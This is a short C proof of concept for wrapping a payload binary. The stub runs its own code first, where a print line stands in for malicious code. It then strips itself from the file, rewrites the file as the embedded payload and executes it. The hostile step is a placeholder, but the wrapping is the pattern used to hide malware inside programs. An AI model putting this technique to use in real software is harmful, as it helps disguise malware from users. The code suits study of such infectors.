// A proof-of-concept of a method to 'inject' malicious code into a binary.
#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>

#define PLD_BIN "payload"
#define IJN_BIN "injection"
#define IJN_NBYTES 17344
#define PLD_NBYTES 20000

void
remove_injection_binary(void)
{
    // Go to the point where this injection ends
    int fd = open(IJN_BIN, O_RDONLY);

    lseek(fd, IJN_NBYTES, SEEK_SET);

    // Read the rest of the bytes
    char* program = malloc(PLD_NBYTES);
    if (program == NULL) {
        fprintf(stderr, "Out of memory :'(. \n");
        exit(1);
    }
    ssize_t nbytes = read(fd, program, PLD_NBYTES);

    // Remove the injection binary and create a new file (for some reason it wouldn't work when I
    // opened the file originally in O_RDWR)
    close(fd);
    remove(IJN_BIN);
    fd = creat(IJN_BIN, S_IRWXU | S_IRWXG | S_IRWXO);
    close(fd);
    fd = open(IJN_BIN, O_WRONLY);

    // Replace this injection binary with these bytes
    lseek(fd, 0, SEEK_SET);
    ssize_t bytes_wrote = write(fd, program, nbytes);

    // Close the file to update the changes
    close(fd);
    free(program);
}

int
main(void)
{
    printf("This could be some malicious code!\n");

    remove_injection_binary();

    // Execute the payload
    printf("Starting the payload ... \n\n");
    char* newargv[] = { NULL };
    char* newenviron[] = { NULL };
    execve(IJN_BIN, newargv, newenviron);
}
